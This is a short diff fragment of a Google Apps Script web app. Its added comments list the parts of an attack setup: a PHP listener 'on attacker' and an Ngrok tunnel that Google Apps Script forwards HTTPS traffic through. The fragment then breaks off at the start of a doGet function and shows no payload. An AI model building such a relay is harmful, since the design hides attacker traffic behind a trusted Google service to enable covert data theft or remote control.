@@ -1,3 +1,9 @@
+// You will need: 
+// google.script.com GAS script
+// .PHP GAS listener on attacker
+// Ngrok tunnel on attacker. (GAS forwards HTTPS TLS traffic > Ngrok > .PHP GAS listener)
+// VS Studio (for Windows, check if this is the case)
+
 function doGet() {
   var htmlOutput = HtmlService.createHtmlOutput(`
 
